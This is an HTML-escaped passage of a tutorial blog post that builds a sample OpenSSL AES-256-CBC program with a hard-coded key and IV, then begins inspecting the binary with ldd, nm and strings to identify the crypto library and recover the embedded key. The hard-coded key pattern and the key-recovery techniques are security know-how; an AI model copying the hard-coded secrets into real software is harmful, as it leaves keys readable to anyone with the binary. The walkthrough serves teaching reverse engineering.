  &lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;iv,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER_CTX&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;ctx;&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;len;&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext_len;&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Create and initialise the context */&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(ctx&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER_CTX_new()))&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;handleErrors();&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Initialise the decryption operation. IMPORTANT - ensure you use a key&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * and IV size appropriate for your cipher&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * In this example we are using 256 bit AES (i.e. a 256 bit key). The&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * IV size for *most* modes is the same as the block size. For AES this&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * is 128 bits */&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_DecryptInit_ex(ctx,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_aes_256_cbc(),&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;NULL&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;key,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;iv))&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;handleErrors();&lt;/span&gt;
  
  &lt;span style=&#34;color: #586E75&#34;&gt;/* Provide the message to be decrypted, and obtain the plaintext output.&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * EVP_DecryptUpdate can be called multiple times if necessary&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   */&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_DecryptUpdate(ctx,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;len,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext_len))&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;handleErrors();&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext_len&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;len;&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Finalise the decryption. Further plaintext bytes may be written at&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * this stage.&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   */&lt;/span&gt;
 
  &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_DecryptFinal_ex(ctx,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;len,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;len))&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;handleErrors();&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext_len&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;len;&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Clean up */&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER_CTX_free(ctx);&lt;/span&gt;

  &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext_len;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;arc,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;argv[])&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #586E75&#34;&gt;/* Set up the key and iv. Do I need to say to not hard code these in a&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * real application? :-)&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   */&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* A 256 bit key */&lt;/span&gt;
  &lt;span style=&#34;color: #586E75&#34;&gt;/// unsigned char *key = &amp;quot;01234567890123456789012345678901&amp;quot;;&lt;/span&gt;
  
  &lt;span style=&#34;color: #586E75&#34;&gt;/// this is still a 256-bit (32 byte) key, each character is treated as one byte&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;key&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;ee12c03ceacdfb5d4c0e67c8f5ab3362&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* A 128 bit IV */&lt;/span&gt;
  &lt;span style=&#34;color: #586E75&#34;&gt;/// unsigned char *iv = &amp;quot;01234567890123456&amp;quot;;&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;iv&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;d36a4bf2e6dd9c68&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Message to be encrypted */&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;
    &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;The quick brown fox jumps over the lazy dog&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Buffer for ciphertext. Ensure the buffer is long enough for the&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * ciphertext which may be longer than the plaintext, dependant on the&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   * algorithm and mode&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;   */&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;];&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Buffer for the decrypted text */&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;decryptedtext[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;];&lt;/span&gt;

  &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;decryptedtext_len,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext_len;&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Initialise the library */&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;ERR_load_crypto_strings();&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;OpenSSL_add_all_algorithms();&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;OPENSSL_config(&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;NULL&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Encrypt the plaintext */&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext_len&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;encrypt(plaintext,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;strlen(plaintext),&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;key,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;iv,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext);&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Do something useful with the ciphertext here */&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Ciphertext is:&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;BIO_dump_fp(stdout,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext_len);&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Decrypt the ciphertext */&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;decryptedtext_len&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;decrypt(ciphertext,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext_len,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;key,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;iv,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;decryptedtext);&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Add a NULL terminator. We are expecting printable text */&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;decryptedtext[decryptedtext_len]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;#39;&amp;#39;;&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Show the decrypted text */&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Decrypted text is:&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;%s&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;decryptedtext);&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;/* Clean up */&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_cleanup();&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;ERR_free_strings();&lt;/span&gt;

  &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;we need the &lt;code&gt;libssl-dev&lt;/code&gt; library which can be installed by &lt;code&gt;sudo apt-get install libssl-dev&lt;/code&gt;. To compile use &lt;code&gt;gcc [filename].c -o [outputfile] -lcrypto -ggdb&lt;/code&gt;. We will use the debug information in GDB later. Here is the output:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;output&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$ gcc AES-OpenSSL.c -ggdb -lcrypto -o sampleaes
$ ./sampleaes
Ciphertext is:
&lt;span style=&#34;color: #2AA198&#34;&gt;0000&lt;/span&gt; - &lt;span style=&#34;color: #2AA198&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;34&lt;/span&gt; 3f &lt;span style=&#34;color: #2AA198&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt; 5d 4e f6-18 1d c6 6d &lt;span style=&#34;color: #2AA198&#34;&gt;41&lt;/span&gt; c1 &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt; ae   Q4?!.&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt;N....mA...
&lt;span style=&#34;color: #2AA198&#34;&gt;0010&lt;/span&gt; - e0 a7 de a0 fa b9 6c b0-91 5e &lt;span style=&#34;color: #2AA198&#34;&gt;21&lt;/span&gt; c6 d3 &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;36&lt;/span&gt;   ......l..^!....6
&lt;span style=&#34;color: #2AA198&#34;&gt;0020&lt;/span&gt; - &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt; 7b ec &lt;span style=&#34;color: #2AA198&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;89&lt;/span&gt; e1 bc 0a-2c &lt;span style=&#34;color: #2AA198&#34;&gt;61&lt;/span&gt; f4 c6 &lt;span style=&#34;color: #2AA198&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;61&lt;/span&gt; 5f 2e   p&lt;span style=&#34;color: #719e07&#34;&gt;{&lt;/span&gt;.i....,a..&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;amp;&lt;/span&gt;a_.
Decrypted text is:
The quick brown fox jumps over the lazy dog
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;2-2-monitoring-library-calls:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2.2 Monitoring Library Calls&lt;/h4&gt;

&lt;p&gt;To monitor these calls, we have a few tools at hand. On *nix operating systems we can use strace (for system calls) and ltrace (for both syscalls and library calls). On Windows we can use &lt;a href=&#34;http://www.rohitab.com/apimonitor&#34; target=&#34;_blank&#34;&gt;API Monitor&lt;/a&gt; as I have used in the &lt;a href=&#34;http://parsiya.net/blog/2014-10-07-my-adventure-with-fireeye-flare-challenge/#ch7&#34; target=&#34;_blank&#34;&gt;past&lt;/a&gt;. If you have a Mac you can try your luck with &lt;a href=&#34;https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/dtruss.1m.html&#34; target=&#34;_blank&#34;&gt;dtruss&lt;/a&gt; which uses dtrace. I am not quite sure if it can be used to trace library calls and if it works on iOS.&lt;/p&gt;

&lt;h5 id=&#34;2-2-1-discovering-shared-libraries:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2.2.1 Discovering Shared Libraries&lt;/h5&gt;

&lt;p&gt;Assuming we are approaching this application from a black-box perspective, we need to discover the shared libraries first. This can be done in different ways. We will talk about &lt;code&gt;ldd&lt;/code&gt;, &lt;code&gt;nm&lt;/code&gt;, &lt;code&gt;strings&lt;/code&gt; or just &lt;code&gt;ltrace&lt;/code&gt;. Just using ltrace may do the job but if there are a lot of library calls, we need to spot critical/interesting libraries to filter out the noise.&lt;/p&gt;

&lt;h6 id=&#34;2-2-1-1-ldd:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2.2.1.1 ldd&lt;/h6&gt;

&lt;p&gt;&lt;code&gt;ldd&lt;/code&gt; “prints shared library dependencies” according to the &lt;a href=&#34;http://man7.org/linux/man-pages/man1/ldd.1.html&#34; target=&#34;_blank&#34;&gt;man&lt;/a&gt; page. Let’s run it.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;running ldd&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$ldd sampleaes
  linux-gate.so.1 &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&amp;gt;  &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0xb77b8000&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;
  libcrypto.so.1.0.0 &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&amp;gt; /usr/lib/i386-linux-gnu/i686/cmov/libcrypto.so.1.0.0 &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0xb75df000&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;
  libc.so.6 &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0xb747b000&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;
  libdl.so.2 &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&amp;gt; /lib/i386-linux-gnu/i686/cmov/libdl.so.2 &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0xb7476000&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;
  libz.so.1 &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&amp;gt; /lib/i386-linux-gnu/libz.so.1 &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0xb745d000&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;
  /lib/ld-linux.so.2 &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0xb77b9000&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;In line 3 we can see &lt;a href=&#34;http://wiki.openssl.org/index.php/Libcrypto_API&#34; target=&#34;_blank&#34;&gt;libcrypto&lt;/a&gt; which means the application is using OpenSSL (the other OpenSSL library is &lt;code&gt;libssl&lt;/code&gt;).&lt;/p&gt;

&lt;h6 id=&#34;2-2-1-2-nm:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2.2.1.2 nm&lt;/h6&gt;

&lt;p&gt;&lt;code&gt;nm&lt;/code&gt; “&lt;a href=&#34;http://unixhelp.ed.ac.uk/CGI/man-cgi?nm&#34; target=&#34;_blank&#34;&gt;lists symbols from object files.&lt;/a&gt;” It’s a good idea to look at its output and look for familiar symbols. We can clearly see OPENSSL and function names in the truncated output.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;running nm&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$ nm sampleaes
         U BIO_dump_fp@@OPENSSL_1.0.0
         U ERR_free_strings@@OPENSSL_1.0.0
         U ERR_load_crypto_strings@@OPENSSL_1.0.0
         U ERR_print_errors_fp@@OPENSSL_1.0.0
         U EVP_CIPHER_CTX_free@@OPENSSL_1.0.0
         U EVP_CIPHER_CTX_new@@OPENSSL_1.0.0
         U EVP_DecryptFinal_ex@@OPENSSL_1.0.0
         U EVP_DecryptInit_ex@@OPENSSL_1.0.0
         U EVP_DecryptUpdate@@OPENSSL_1.0.0
         U EVP_EncryptFinal_ex@@OPENSSL_1.0.0
         U EVP_EncryptInit_ex@@OPENSSL_1.0.0
         U EVP_EncryptUpdate@@OPENSSL_1.0.0
         U EVP_aes_256_cbc@@OPENSSL_1.0.0
         U EVP_cleanup@@OPENSSL_1.0.0
         U OPENSSL_add_all_algorithms_noconf@@OPENSSL_1.0.0
         U OPENSSL_config@@OPENSSL_1.0.0
0804900c d _DYNAMIC
&lt;span style=&#34;color: #2AA198&#34;&gt;08049108&lt;/span&gt; d _GLOBAL_OFFSET_TABLE_
08048d4c R _IO_stdin_used
         w _ITM_deregisterTMCloneTable
         w _ITM_registerTMCloneTable
         w _Jv_RegisterClasses
...
&lt;span style=&#34;color: #586E75&#34;&gt;# removed the rest of the output&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h6 id=&#34;2-2-1-3-strings:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2.2.1.3 strings&lt;/h6&gt;

&lt;p&gt;&lt;code&gt;strings&lt;/code&gt; is useful because it may leak great information about the binary. It will give us the key and IV directly in our example. We can also see OpenSSL and libcrypto strings. It also gives us the version of the used OpenSSL library.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;running strings&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;strings&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;sampleaes&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;lib&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;ld&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;linux.so&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;.2&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;libcrypto.so&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;.1.0.0&lt;/span&gt;
